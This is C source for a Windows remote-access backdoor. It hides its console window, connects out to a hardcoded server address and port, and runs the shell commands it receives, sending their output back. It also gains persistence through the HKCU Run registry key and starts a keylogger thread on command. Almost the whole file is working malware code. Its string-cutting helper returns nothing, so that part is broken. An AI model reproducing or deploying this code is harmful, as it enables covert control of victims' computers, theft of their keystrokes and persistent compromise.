#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <winerror.h>  // Add this line for ERROR_SUCCESS

#include "keylogger2.h"

#define bzero(p, size) (void) memset((p), 0, (size))

int sock;

// Function to create a persistent registry entry for the program
int bootRun() {
    char err[128] = "Failed\n";  // Error message
    char suc[128] = "Created Persistent At : HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n";  // Success message
    TCHAR szPath[MAX_PATH];
    DWORD pathlen = 0;

    // Get the path of the current executable
    pathlen = GetModuleFileName(NULL, szPath, MAX_PATH);
    if (pathlen == 0) {
        send(sock, err, sizeof(err), 0);  // Send error message to the server
        return -1;
    }

    HKEY NewVal;

    // Open or create registry key for program persistence
    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
        send(sock, err, sizeof(err), 0);  // Send error message to the server
        return -1;
    }

    // Set the registry value to make the program run on startup
    DWORD pathLenInBytes = pathlen * sizeof(*szPath);
    if (RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
        RegCloseKey(NewVal);
        send(sock, err, sizeof(err), 0);  // Send error message to the server
        return -1;
    }
    RegCloseKey(NewVal);
    send(sock, suc, sizeof(suc), 0);  // Send success message to the server
    return 0;
}

// Function to cut a substring from a given string
char *str_cut(char str[], int slice_from, int slice_to) {
    if (str[0] == '\0')
        return NULL;

    char *buffer;
    size_t str_len, buffer_len;

    if (slice_to < 0 && slice_from > slice_to) {
        // Handle negative slice_to index
        str_len = strlen(str);
        if (abs(slice_to) > str_len - 1)
            return NULL;
        if (abs(slice_from) > str_len)
            slice_from = (-1) * str_len;

        buffer_len = slice_to - slice_from;
        str += (str_len + slice_from);
    } else if (slice_from >= 0 && slice_to > slice_from) {
        // Handle positive slice_from and slice_to indices
        str_len = strlen(str);

        if(slice_from > str_len - 1)
            return NULL;
        buffer_len = slice_to - slice_from;
        str += slice_from;
    } else
        return NULL;
}

// Main function for handling commands from the server
void Shell() {
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while (1) {
        jump:
        bzero(buffer, 1024);  // Zero out the buffer
        bzero(container, sizeof(container));  // Zero out the container
        bzero(total_response, sizeof(total_response));  // Zero out the total_response
        recv(sock, buffer, 1024, 0);  // Receive command from the server

        if (strncmp("q", buffer, 1) == 0) {
            closesocket(sock);  // Close the socket
            WSACleanup();  // Clean up Winsock
            exit(0);  // Exit the program
        } else if (strncmp("cd ", buffer, 3) == 0) {
            chdir(str_cut(buffer, 3, 100));  // Change current working directory
        } else if (strncmp("persist", buffer, 7) == 0) {
            bootRun();  // Attempt to create a persistent registry entry
        } else if (strncmp("keylog_start", buffer, 12) == 0) {
            HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);  // Start a keylogger in a new thread
            goto jump;  // Jump to the beginning of the loop
        } else {
            FILE *fp;
            fp = _popen(buffer, "r");  // Execute command using _popen
            while(fgets(container, 1024, fp) != NULL) {
                strcat(total_response, container);  // Concatenate command output to total_response
            }
            send(sock, total_response, sizeof(total_response), 0);  // Send command output to the server
            fclose(fp);
        }
    }
}

// Entry point for the Windows application
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HWND stealth;
    AllocConsole();  // Allocate a console window
    stealth = FindWindowA("ConsoleWindowClass", NULL);  // Find the console window

    ShowWindow(stealth, 0);  // Hide the console window

    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData;

    ServIP = "192.168.1.91";  // Server IP address
    ServPort = 50005;  // Server port

    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
        exit(1);  // Exit if Winsock initialization fails
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);  // Create a socket

    memset(&ServAddr, 0, sizeof(ServAddr));  // Zero out the server address structure
    ServAddr.sin_family = AF_INET;  // Set the address family
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);  // Set the server IP address
    ServAddr.sin_port = htons(ServPort);  // Set the server port

    start:
    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
        Sleep(10);  // Sleep for 10 milliseconds before attempting to connect again
        goto start;  // Jump to the beginning of the loop
    }

    Shell();  // Start the main command-handling function

    return 0;  // Return 0 to indicate successful execution
}
